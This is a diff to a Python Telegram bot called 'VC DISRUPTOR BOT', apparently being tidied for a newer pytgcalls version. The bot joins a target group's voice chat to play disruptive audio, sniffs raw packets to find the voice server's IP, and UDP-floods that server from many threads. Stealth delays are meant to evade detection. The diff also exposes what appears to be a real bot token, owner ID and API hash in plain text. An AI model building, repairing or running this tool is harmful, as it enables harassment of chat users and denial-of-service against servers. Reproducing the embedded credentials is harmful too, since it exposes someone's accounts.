@@ -17,21 +17,20 @@ from pyrogram import Client, filters
 from pyrogram.types import Message
 from pyrogram.errors import UserNotParticipant
 
-# Import pytgcalls properly
+# Import pytgcalls - version 2.1.0 compatible
 from pytgcalls import PyTgCalls
 from pytgcalls.types import AudioPiped
-from pytgcalls.types.input_stream import AudioPiped as AudioPipedStream
 
 # ═══════════════════════════════════════════════════
 # CONFIGURATION — User ko edit karna hai
 # ═══════════════════════════════════════════════════
 
 # Bot Config
-BOT_TOKEN = "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ"  # @BotFather se
-OWNER_ID = 7302427268  # Step 2 mein mila user ID
+BOT_TOKEN = "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ"
+OWNER_ID = 7302427268
 
 # Telegram Account (Session)
-SESSION_STRING = "BQAN3s...apna_session_string..."  # @SessionStringBot se
+SESSION_STRING = "BQAN3s...apna_session_string..."
 
 # Attack Defaults
 AUDIO_DURATION = 20
@@ -113,17 +112,8 @@ def detect_vc_ip(duration=15):
     print(f"[🔍] Detecting VC server IP ({duration}s)...")
     
     try:
-        # Try raw socket with root
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
         sock.settimeout(1)
-    except PermissionError:
-        print("[!] Raw socket requires root! Trying alternative...")
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.bind(('', 0))
-            sock.settimeout(1)
-        except:
-            return None, None
     except:
         return None, None
     
@@ -134,14 +124,13 @@ def detect_vc_ip(duration=15):
         try:
             packet = sock.recvfrom(65536)[0]
             try:
-                # Parse IP header
                 ip_header = packet[0:20]
                 iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                 src_ip = socket.inet_ntoa(iph[8])
                 dst_ip = socket.inet_ntoa(iph[9])
                 protocol = iph[6]
                 
-                if protocol == 17:  # UDP
+                if protocol == 17:
                     udp_header = packet[20:28]
                     src_port, dst_port = struct.unpack('!HH', udp_header[:4])
                     
@@ -155,8 +144,6 @@ def detect_vc_ip(duration=15):
                                 break
             except:
                 continue
-        except socket.timeout:
-            continue
         except:
             continue
     
@@ -182,7 +169,6 @@ def udp_flood_worker(ip, port, duration, tid, stop_event):
                 payload = random._urandom(random.randint(512, 1400))
                 sock.sendto(payload, (ip, port))
                 sent += 1
-                # Small random delay to avoid detection
                 time.sleep(random.uniform(0.001, 0.003))
             except:
                 pass
@@ -246,13 +232,12 @@ def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
 # ─── TELEGRAM BOT HANDLERS ───
 
 def owner_only(func):
-    """Decorator: Only owner can use commands"""
     async def wrapper(client, message: Message):
         try:
             if message.from_user.id != OWNER_ID:
                 await message.reply("❌ Unauthorized! Sirf owner commands use kar sakta hai.")
                 return
-        except AttributeError:
+        except:
             await message.reply("❌ Could not identify user.")
             return
         return await func(client, message)
@@ -273,13 +258,6 @@ async def start_cmd(client, message: Message):
 ⚙️ `/set <param> <value>` — Change settings
 📋 `/settings` — Show all settings
 🔄 `/reset` — Reset to defaults
-
-**Parameters you can change:**
-• `duration` — Audio duration (sec)
-• `udp_duration` — UDP flood duration (sec)  
-• `threads` — UDP threads (5-50)
-• `tone` — Tone frequency Hz (5000-12000)
-• `stealth` — Stealth mode (True/False)
 """
     await message.reply(text)
 
@@ -330,7 +308,7 @@ async def target_cmd(client, message: Message):
                 bot_state["target_id"] = chat.id
                 bot_state["target_name"] = chat.title
                 await message.reply(f"[✅] Target set: **{chat.title}**\nID: `{chat.id}`")
-            except Exception as e:
+            except:
                 try:
                     if "t.me/" in link:
                         username = link.split("/")[-1]
@@ -344,8 +322,8 @@ async def target_cmd(client, message: Message):
                     bot_state["target_id"] = chat.id
                     bot_state["target_name"] = chat.title
                     await message.reply(f"[✅] Target set: **{chat.title}**\nID: `{chat.id}`")
-                except Exception as e2:
-                    await message.reply(f"[!] Could not find/join group: {e2}")
+                except:
+                    await message.reply("[!] Could not find/join group.")
                     return
         else:
             try:
@@ -375,7 +353,6 @@ async def attack_cmd(client, message: Message):
         await message.reply("❌ No target set! Use /target first.")
         return
     
-    app = bot_state["app"]
     pytgcalls = bot_state["pytgcalls"]
     chat_id = bot_state["target_id"]
     
@@ -388,24 +365,20 @@ async def attack_cmd(client, message: Message):
     bot_state["stop_event"] = stop_event
     
     try:
-        # Step 1: Detect VC IP
+        # Detect VC IP
         await message.reply("[🔍] Detecting VC server IP (15s)...")
         vc_ip, vc_port = detect_vc_ip(15)
         bot_state["vc_ip"] = vc_ip
         
-        # Step 2: Join VC with audio
+        # Generate audio
         audio_buf = generate_disruptive_audio()
         
         if STEALTH_MODE:
-            wait = random.uniform(2, 5)
-            await asyncio.sleep(wait)
+            await asyncio.sleep(random.uniform(2, 5))
         
+        # Join VC
         try:
-            # Fixed: Using AudioPiped correctly
-            await pytgcalls.join_group_call(
-                chat_id,
-                AudioPiped(audio_buf)
-            )
+            await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
             await message.reply(f"[✅] Audio flood active! Playing for {AUDIO_DURATION}s")
         except Exception as e:
             await message.reply(f"[❌] Could not join voice chat: {e}")
@@ -413,7 +386,7 @@ async def attack_cmd(client, message: Message):
             bot_state["status"] = "target_set"
             return
         
-        # Step 3: Start UDP flood in background
+        # UDP flood
         if vc_ip and vc_port:
             udp_thread = threading.Thread(
                 target=lambda: start_udp_flood(vc_ip, vc_port, UDP_DURATION, UDP_THREADS, stop_event),
@@ -424,16 +397,16 @@ async def attack_cmd(client, message: Message):
         else:
             await message.reply("[⚠️] No VC IP detected. Audio-only attack.")
         
-        # Step 4: Wait for audio to finish
+        # Wait
         await asyncio.sleep(AUDIO_DURATION + 2)
         
-        # Step 5: Leave VC
+        # Leave VC
         try:
             await pytgcalls.leave_group_call(chat_id)
         except:
             pass
         
-        # Step 6: Stop UDP
+        # Stop UDP
         stop_udp_flood(stop_event)
         
         elapsed = int(time.time() - bot_state["attack_start"])
@@ -451,11 +424,9 @@ async def stop_cmd(client, message: Message):
         await message.reply("ℹ️ No active attack to stop.")
         return
     
-    # Stop UDP flood
     if bot_state.get("stop_event"):
         stop_udp_flood(bot_state["stop_event"])
     
-    # Leave VC
     try:
         pytgcalls = bot_state["pytgcalls"]
         chat_id = bot_state["target_id"]
@@ -476,9 +447,9 @@ async def settings_cmd(client, message: Message):
     text = f"""
 📋 **Current Settings**
 
-• `duration` = {AUDIO_DURATION} (Audio flood seconds)
-• `udp_duration` = {UDP_DURATION} (UDP flood seconds)
-• `threads` = {UDP_THREADS} (UDP threads)
+• `duration` = {AUDIO_DURATION}
+• `udp_duration` = {UDP_DURATION}
+• `threads` = {UDP_THREADS}
 • `tone` = {TONE_FREQUENCY} Hz
 • `amplitude` = {AUDIO_AMPLITUDE}
 • `stealth` = {STEALTH_MODE}
@@ -491,7 +462,7 @@ async def settings_cmd(client, message: Message):
 @owner_only
 async def set_cmd(client, message: Message):
     if len(message.command) < 3:
-        await message.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
+        await message.reply("❌ Usage: /set <param> <value>")
         return
     
     param = message.command[1].lower()
@@ -541,7 +512,7 @@ async def reset_cmd(client, message: Message):
     if os.path.exists(CONFIG_FILE):
         os.remove(CONFIG_FILE)
     
-    await message.reply("[✅] Reset to defaults. /target set karna hoga dobara.")
+    await message.reply("[✅] Reset to defaults.")
 
 # ─── MAIN ───
 
@@ -549,27 +520,17 @@ async def main():
     print(r"""
     ╔══════════════════════════════════════════════════════════════╗
     ║               VC DISRUPTOR BOT                              ║
-    ║   Bot se command do -> /target, /attack, /stop             ║
     ╚══════════════════════════════════════════════════════════════╝
     """)
     
-    # Load config
     load_bot_config()
     
-    # Verify bot token
-    if BOT_TOKEN == "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ":
-        print("[!] Warning: Please replace BOT_TOKEN with your actual bot token!")
-    else:
-        print("[✓] Bot token configured")
-    
-    # Verify session string
     if SESSION_STRING == "BQAN3s...apna_session_string...":
         print("[!] Please replace SESSION_STRING with your actual session string!")
         sys.exit(1)
     
-    print("[📡] Initializing user account (Pyrogram)...")
+    print("[📡] Initializing user account...")
     
-    # Initialize User Account (for VC)
     try:
         app = Client("vc_bot_session", session_string=SESSION_STRING, in_memory=True)
         await app.start()
@@ -579,7 +540,6 @@ async def main():
         print(f"[!] User login failed: {e}")
         sys.exit(1)
     
-    # Initialize PyTgCalls
     try:
         pytgcalls = PyTgCalls(app)
         await pytgcalls.start()
@@ -588,13 +548,11 @@ async def main():
         print(f"[!] PyTgCalls failed: {e}")
         sys.exit(1)
     
-    # Store in global state
     bot_state["app"] = app
     bot_state["pytgcalls"] = pytgcalls
     
     print("[🤖] Starting Telegram Bot...")
     
-    # Initialize Bot
     bot = Client(
         "vc_disruptor_bot",
         bot_token=BOT_TOKEN,
@@ -602,51 +560,39 @@ async def main():
         api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e"
     )
     
-    # Register handlers
     @bot.on_message(filters.command("start"))
-    async def start_handler(client, message):
-        await start_cmd(client, message)
+    async def h1(client, m): await start_cmd(client, m)
     
     @bot.on_message(filters.command("status"))
-    async def status_handler(client, message):
-        await status_cmd(client, message)
+    async def h2(client, m): await status_cmd(client, m)
     
     @bot.on_message(filters.command("target"))
-    async def target_handler(client, message):
-        await target_cmd(client, message)
+    async def h3(client, m): await target_cmd(client, m)
     
     @bot.on_message(filters.command("attack"))
-    async def attack_handler(client, message):
-        await attack_cmd(client, message)
+    async def h4(client, m): await attack_cmd(client, m)
     
     @bot.on_message(filters.command("stop"))
-    async def stop_handler(client, message):
-        await stop_cmd(client, message)
+    async def h5(client, m): await stop_cmd(client, m)
     
     @bot.on_message(filters.command("settings"))
-    async def settings_handler(client, message):
-        await settings_cmd(client, message)
+    async def h6(client, m): await settings_cmd(client, m)
     
     @bot.on_message(filters.command("set"))
-    async def set_handler(client, message):
-        await set_cmd(client, message)
+    async def h7(client, m): await set_cmd(client, m)
     
     @bot.on_message(filters.command("reset"))
-    async def reset_handler(client, message):
-        await reset_cmd(client, message)
+    async def h8(client, m): await reset_cmd(client, m)
     
     print("\n" + "="*55)
     print("  ✅ BOT IS RUNNING!")
-    print("  Telegram mein apne bot ko search karo")
-    print("  Aur commands bhejo!")
     print("="*55)
-    print(f"\n  First: /target <group_link>")
-    print(f"  Then:  /attack")
-    print(f"  Stop:  /stop\n")
+    print(f"\n  /target <group>")
+    print(f"  /attack")
+    print(f"  /stop\n")
     
     try:
         await bot.start()
-        # Keep running
         while True:
             await asyncio.sleep(10)
     except KeyboardInterrupt:
